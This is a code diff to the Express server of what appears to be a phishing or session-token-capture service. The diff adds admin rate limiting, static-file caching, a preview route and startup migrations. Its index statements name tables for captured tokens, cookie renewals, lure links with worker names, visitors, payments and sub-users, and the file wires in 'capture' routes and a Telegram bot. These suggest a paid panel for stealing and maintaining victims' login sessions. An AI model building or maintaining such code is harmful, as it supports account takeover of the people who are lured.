@@ -30,6 +30,7 @@ const analyticsRoutes = require('./backend/routes/analytics');
 const systemRoutes = require('./backend/routes/system');
 const captureRoutes = require('./backend/routes/capture');
 const deviceRoutes = require('./backend/routes/device');
+const previewRoutes = require('./backend/routes/preview');
 
 // Service imports
 const sessionKeeper = require('./backend/services/sessionkeeper')
@@ -104,6 +105,16 @@ const adminAuthLimiter = rateLimit({
 });
 app.use('/api/auth/admin-login', adminAuthLimiter);
 
+// Rate limiter for admin API routes (prevent brute-force on admin endpoints)
+const adminApiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 30,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'Too many admin API attempts, please wait.' },
+});
+app.use('/api/admin', adminApiLimiter);
+
 // --- .html extension cleaner & clean-URL resolver ---
 // Configured static dirs to resolve clean URLs against
 const HTML_DIRS = ['admin-panel', 'user-panel'];
@@ -138,11 +149,23 @@ app.use((req, res, next) => {
 // Root redirect → user-panel login
 app.get('/', (req, res) => res.redirect(302, '/user-panel'));
 
-// Static files
-app.use('/admin-panel', express.static(path.join(__dirname, 'admin-panel')));
-app.use('/user-panel', express.static(path.join(__dirname, 'user-panel')));
-app.use('/templates', express.static(path.join(__dirname, 'templates')));
-app.use('/verification-designs', express.static(path.join(__dirname, 'verification-designs')));
+// Static files with cache headers for performance
+app.use('/admin-panel', express.static(path.join(__dirname, 'admin-panel'), {
+  maxAge: '1d',
+  immutable: true
+}));
+app.use('/user-panel', express.static(path.join(__dirname, 'user-panel'), {
+  maxAge: '1d',
+  immutable: true
+}));
+app.use('/templates', express.static(path.join(__dirname, 'templates'), {
+  maxAge: '7d',
+  immutable: true
+}));
+app.use('/verification-designs', express.static(path.join(__dirname, 'verification-designs'), {
+  maxAge: '7d',
+  immutable: true
+}));
 
 // --- API Routes ---
 app.use('/api/auth', authRoutes);
@@ -160,6 +183,7 @@ app.use('/api/feedback', feedbackRoutes);
 app.use('/api/analytics', analyticsRoutes);
 app.use('/api/system', systemRoutes);
 app.use('/api/device', deviceRoutes);
+app.use('/api/preview', previewRoutes);
 
 // Public notice endpoint - requires authentication for privacy reasons
 app.get('/api/notices/latest', async (req, res) => {
@@ -406,6 +430,56 @@ app.use((err, req, res, next) => {
 app.use('/api/capture', captureRoutes);
 
 require('./telegram-bot/bot');
+
+// --- Auto-run schema migrations on startup ---
+async function runMigrations() {
+  try {
+    const fs = require('fs');
+    const path = require('path');
+    const migrations = [
+      'add_client_id_column.sql',
+      'add_performance_indexes.sql',
+    ];
+    for (const mig of migrations) {
+      const migPath = path.join(__dirname, 'backend', 'database', mig);
+      if (fs.existsSync(migPath)) {
+        const sql = fs.readFileSync(migPath, 'utf8');
+        const statements = sql.split(';').map(s => s.trim()).filter(s => s.length > 0);
+        for (const stmt of statements) {
+          try { await db.query(stmt); } catch (e) { /* ignore already-applied */ }
+        }
+        console.log(`[DB] Applied migration: ${mig}`);
+      }
+    }
+    // Also ensure indexes from schema.sql exist (safe to re-run)
+    const indexStatements = [
+      'CREATE INDEX IF NOT EXISTS idx_captured_tokens_user_id ON captured_tokens(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_captured_tokens_link_id ON captured_tokens(link_id)',
+      'CREATE INDEX IF NOT EXISTS idx_captured_tokens_deleted ON captured_tokens(user_id, deleted, created_at)',
+      'CREATE INDEX IF NOT EXISTS idx_links_user_id ON links(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_links_worker_name ON links(worker_name)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_user_id ON visitors(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_link_id ON visitors(link_id)',
+      'CREATE INDEX IF NOT EXISTS idx_payments_user_id ON payments(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_cookie_renewals_capture_id ON cookie_renewals(capture_id)',
+      'CREATE INDEX IF NOT EXISTS idx_cookie_renewals_user_id ON cookie_renewals(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_deployment_logs_link_id ON deployment_logs(link_id)',
+      'CREATE INDEX IF NOT EXISTS idx_login_history_user_id ON login_history(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_login_history_admin_id ON login_history(admin_id)',
+      'CREATE INDEX IF NOT EXISTS idx_feedback_user_id ON feedback(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_user_sessions_user_id ON user_sessions(user_id)',
+      'CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON user_sessions(session_token)',
+      'CREATE INDEX IF NOT EXISTS idx_sub_users_parent ON sub_users(parent_user_id)',
+    ];
+    for (const stmt of indexStatements) {
+      try { await db.query(stmt); } catch (e) { /* index may already exist */ }
+    }
+    console.log('[DB] All migrations and indexes applied successfully');
+  } catch (err) {
+    console.error('[DB] Migration error (non-fatal):', err.message);
+  }
+}
+runMigrations().catch(err => console.error('[DB] Migration failed:', err.message));
 
 // --- Start Server ---
 server.listen(config.PORT, () => {
